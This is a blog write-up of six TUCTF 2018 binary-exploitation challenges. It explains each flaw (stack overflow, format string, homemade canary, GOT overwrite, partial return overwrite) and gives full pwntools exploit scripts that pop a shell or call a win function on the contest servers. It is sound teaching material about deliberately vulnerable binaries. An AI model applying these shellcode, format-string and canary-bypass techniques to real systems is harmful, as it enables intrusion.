---
title: "TUCTF 2018 Writeup"
date: 2018-11-26T08:09:55+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up"
]
description: My solves for TUCTF 2018 challenges
---

# Shella Easy

## Problem

Difficulty: easy-ish
Want to be a drive-thru attendant?
Well, no one does... But! the best employee receives their very own flag! 
whatdya say?

nc 52.15.182.55 12345

[shella-easy](/blog/2018/tuctf-writeup/Shella Easy/shella-easy)

## Solution

Let's take a look at the `main` function:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+0h] [ebp-48h]
  int v5; // [esp+40h] [ebp-8h]

  setvbuf(stdout, 0, 2, 0x14u);
  setvbuf(stdin, 0, 2, 0x14u);
  v5 = -889275714;
  printf("Yeah I'll have a %p with a side of fries thanks\n", &s);
  gets(&s);
  if ( v5 != -559038737 )
    exit(0);
  return 0;
}
```

As you can see, we have a memory leak with the `printf` call and a buffer overflow with the `gets` call. Furthermore, [NX](https://en.wikipedia.org/wiki/NX_bit) is not enabled for the binary, and the stack is readable, writable, and executable:

```
$ r2 -d ./shella-easy
...
[0xf7ed8c70]> i
...
nx       false
...
[0xf7ed8c70]> dm
...
0xffddb000 - 0xffdfd000 - usr   136K s rwx [stack] [stack] ; map.stack_.rwx
```

So our objective is to first overwrite the `v5` variable to equal to `-559038737` or `0xDEADBEEF` in hex. You can do the signed integer to hex conversion using a [online tool](http://www.binaryconvert.com/convert_signed_int.html) or just python.

Then we can control the `eip` register and execute a shellcode than is placed on the stack with our input.

In conclusion, this is how our payload should look like:

* shellcode
* padding to 0x40 bytes
* 0xDEADBEEF <-- overwrite `v5`
* 8 bytes padding
* the leaked stack address that points to our shellcode

Here is the exploit in python:

```python
from pwn import *

# sh = process('./shella-easy')
sh = remote('52.15.182.55', 12345)
addr = sh.recvuntil('thanks\n').split(' ')[4][2:]
addr = int(addr, 16)

shellcode = asm(shellcraft.i386.linux.sh())

payload = ''
payload += shellcode
payload += 'a'*(0x40-len(shellcode))
payload += p32(0xDEADBEEF) # -559038737
payload += 'a'*8
payload += p32(addr)

sh.sendline(payload)
sh.interactive()
```

flag: `TUCTF{1_607_4_fl46_bu7_n0_fr135}`

# Ehh

## Problem

Difficulty: easy
Whatever... I dunno

nc 18.222.213.102 12345

[ehh](/blog/2018/tuctf-writeup/Ehh/ehh)

## Solution

This is a simple format string attack using `printf` and `%n`.

We have to overwrite a given address with `0x18`. Here is the exploit:

```python
from pwn import *

# sh = process('./ehh')
sh = remote('18.222.213.102', 12345)

addr = int(sh.recvuntil('\n').split(' ')[-1][2:], 16)

payload = ''
payload += p32(addr)
payload += '%{}x'.format(0x18-4)
payload += '%6$n'

# for i in range(4,100):
#     payload += '%{}$x '.format(i)

sh.sendline(payload)

sh.interactive()
```

flag: `TUCTF{pr1n7f_15_pr377y_c00l_huh}`

# Canary

## Problem

Difficulty: easy
I can fix overflows easy! I'll just make my own stack canary no problem. 
Just try and pwn this, I dare you

nc 18.222.227.1 12345

[canary](/blog/2018/tuctf-writeup/Canary/canary)

## Solution

For this problem we have to defeat a custom implementation of a stack canary.

After some reversing of the binary. We can see that, basically, this is how the stack looks like:

* 40 bytes of input <-- esp
* 4 bytes of canary from `/dev/urandom`
* index counter to the copy of the canary in `.bss`
* other stuff

Looking at this, we can see that if we overwrite the canary alone, the `checkCanary` will just exit: 

```
int __cdecl checkCanary(int canary)
{
  int result; // eax

  result = *(_DWORD *)(canary + 40);
  if ( result != cans[*(_DWORD *)(canary + 44)] )
  {
    puts("---------------------- HEY NO STACK SMASHING! --------------------");
    exit(1);
  }
  return result;
}
```

So, we have to change the index counter as well. Because the `cans` global array is located inside the `.bss` section, we know that it is initialized with `0x00`, and we are able to input null bytes through the `read` call in `doCanary`:

```
int __cdecl doCanary(void *buf)
{
  initCanary((canary *)buf);
  read(0, buf, 0x1A4u);
  return checkCanary((int)buf);
}
```

So in summary, we can overwrite the canary with null bytes and change the index counter to something that is larger than zero which will just point to a random place in `.bss`. Then both pointers to the canary will point to 4 null bytes, and the stack smashing detection would be bypassed. After bypassing the canary, we can just take control of `eip` and print out the flag.

Here is the exploit in python:

```python
from pwn import *

# sh = process('./canary')
sh = remote('18.222.227.1', 12345)

win = 0x080486b7

payload = 'a'*40
payload += '\x00'*4
payload += p32(2)
payload += p32(win)*10 # just to make sure :)

sh.sendlineafter('? ', payload)
sh.interactive()
```

flag: `TUCTF{n3v3r_r0ll_y0ur_0wn_c4n4ry}`

# Shella Hard

## Problem

Difficulty: mind-melting hard
This program is crap! Is there even anything here?

nc 3.16.169.157 12345

[shella-hard](/blog/2018/tuctf-writeup/Shella Hard/shella-hard)

## Solution

Unlike [Shella Easy](#shella-easy), this time NX is enabled, and we only have a 14 bytes overflow which is not enough for a ROP chain to call `execve`:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+0h] [ebp-10h]

  read(0, &buf, 0x1Eu);
  return 0;
}
```

However, we have a function named `giveShell`:

```
$ r2 ./shella-hard
[0x08048340]> aaaa
[0x08048340]> pdf @ sym.giveShell
/ (fcn) sym.giveShell 26
|   sym.giveShell ();
|           0x08048458      55             push ebp
|           0x08048459      89e5           mov ebp, esp
|           0x0804845b      90             nop
|           0x0804845c      a1446a006a     mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1
|           0x08048461      006800         add byte [eax], ch
|           0x08048464      850408         test dword [eax + ecx], eax ; [0x13:4]=-1 ; 19
|           0x08048467      e8b4feffff     call sym.imp.execve
|           0x0804846c      83c40c         add esp, 0xc
|           0x0804846f      90             nop
|           0x08048470      c9             leave
\           0x08048471      c3             ret
```

Looking at the assembly, the function looks a bit off. We don't usually see a `test` instruction in from tof a `call` instruction.

Inspired by the hint: "read between the lines. If you know what I mean", I decided to disassemble the function with a certain offset:

```
[0x08048340]> pd 8 @ sym.giveShell+6
|           0x0804845e      6a00           push 0
|           0x08048460      6a00           push 0
|           0x08048462      6800850408     push str.bin_sh             ; 0x8048500 ; "/bin/sh"
|           0x08048467      e8b4feffff     call sym.imp.execve
|           0x0804846c      83c40c         add esp, 0xc
|           0x0804846f      90             nop
|           0x08048470      c9             leave
\           0x08048471      c3             ret
```

And there we have it, a rop gadget that will open a shell for us. All we have to do is to overwrite the ret pointer to `0x0804845e`, and we are set.

Here is the python exploit:

```python
from pwn import *

# sh = process('./shella-hard')
sh = remote('3.16.169.157', 12345)

giveShell = 0x08048458

payload = 'a'*20
payload += p32(giveShell+6)

sh.sendline(payload)

sh.interactive()
```

flag: `TUCTF{175_wh475_1n51d3_7h47_c0un75}`

# Timber

## Problem

Difficulty: easy
Are you a single lumberjack tired of striking out?
Well not with Timber!
Our deep learning neural network is sure to find a perfect match for you. Try Timber today!

nc 18.222.250.47 12345

[timber](/blog/2018/tuctf-writeup/Timber/timber)

## Solution

This is a hard version of [Ehh](#ehh). We have to again use a format string attack to overwrite some values. This time, we have to overwrite the GOT entry table and call the `date` function which is, in fact, a win function.

Here is the python exploit:

```python
from pwn import *

# sh = process('./timber')
sh = remote('18.222.250.47', 12345)

print sh.recvuntil('name: ')

puts_GOT = 0x804b01c
win_addr = 0x0804867b

payload = ''
payload += p32(puts_GOT)
payload += p32(puts_GOT+2)
payload += '%{}x'.format(0x0804-8)
payload += '%3$hn'
payload += '%{}x'.format(0x867b-0x0804)
payload += '%2$hn'

# for i in range(0,100):
#     payload += '%{}$x '.format(i)

sh.sendline(payload)

sh.interactive()
```

For more explanation on format string attacks, you can check out my [picoCTF 2018 writeup](/blog/posts/picoctf-2018-writeup/binary-exploitation/).

flag: `TUCTF{wh0_64v3_y0u_7h47_c4n4ry}`

# Lisa

## Problem

Difficulty: medium-ish
Ayo, Johhny's got your take from the job.
Go meet up with em' to claim your share.
Oh, and stop asking to see the Mona Lisa alright. It's embarrassing

nc 18.191.244.121 12345

[lisa](/blog/2018/tuctf-writeup/Lisa/lisa)

## Solution

This to me is the more interesting pwn challenge in this CTF.

Basically, you get a address leak to the password buffer and a buffer overflow in the `fail` function that allows you to change the least significant byte of the return address:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char input; // [esp+0h] [ebp-34h]

  setvbuf(stdout, 0, 2, 0x14u);
  setvbuf(stdin, 0, 2, 0x14u);
  memset(&input, 0, 0x30u);
  pass = malloc(0x2Bu);
  printf("Here's your share: %p\n", pass);
  puts("What? The Mona Lisa!\nLook, if you want somethin' from me, I'm gonna need somethin' from you alright...");
  read(0, &input, 0x30u);
  inp = &input;
  pfd = open("./password", 0);
  read(pfd, pass, 0x2Bu);
  checkPass();
  return 0;
}

int checkPass()
{
  int result; // eax
  char buf; // [esp+0h] [ebp-18h]

  if ( doStrcmp(inp, (char *)pass) )
    result = lisa();
  else
    result = fail(&buf);
  return result;
}

ssize_t __cdecl fail(void *buf)
{
  puts("Ugh! You kiss your mother with that mouth?");
  return read(0, buf, 29u);
}
```

Using this overflow, we have to somehow call the `lisa` function that will print out the flag.

Because we can only control the least significant byte, our option is pretty limited:

```
$ r2 ./lisa
[0x000005f0]> aaaa
[0x000005f0]> s sym.main
[0x00000c40]> pdf
...
|           0x00000d01      8d8340000000   lea eax, [ebx + 0x40]       ; "4" ; '@'
|           0x00000d07      8b10           mov edx, dword [eax]
|           0x00000d09      8d8348000000   lea eax, [ebx + 0x48]       ; 'H'
|           0x00000d0f      8b00           mov eax, dword [eax]
|           0x00000d11      6a2b           push 0x2b                   ; '+' ; size_t nbyte
|           0x00000d13      52             push edx                    ; void *buf
|           0x00000d14      50             push eax                    ; int fildes
|           0x00000d15      e836f8ffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x00000d1a      83c40c         add esp, 0xc
|           0x00000d1d      e89cfaffff     call sym.checkPass
|           0x00000d22      b800000000     mov eax, 0
|           0x00000d27      8b5dfc         mov ebx, dword [local_4h]
|           0x00000d2a      c9             leave
\           0x00000d2b      c3             ret
```

Here are all the places that we can jump to. However, because it is a 32 bit binary and our buffer is the first thing on the stack, we can use our input to pass arguments to functions which is a plus.

Using both the stack layout and our overflow, we can jump to `0x00000d15` and supply the arguments for the `read` call using our input.

So if we can write to the password buffer and make it identical to the input buffer, we can then get the flag.

Here is the python code that does that:

```python
from pwn import *

# sh = process('./lisa')
sh = remote('18.191.244.121', 12345)
pass_addr = int(sh.recvuntil('...\n').split('\n')[0].split(' ')[-1][2:], 16)
print hex(pass_addr)
pause()

payload = p32(0)
payload += p32(pass_addr)
payload += p32(0x1d)
sh.sendline(payload)

payload = 'a'*0x18
payload += 'a'*4
payload += '\x15'
sh.sendafter('mouth?\n', payload)

payload = p32(0)
payload += p32(pass_addr)
payload += p32(0x1d)
sh.sendline(payload)

sh.interactive()
```

flag: `TUCTF{wh0_pu7_7h47_buff3r_7h3r3?}`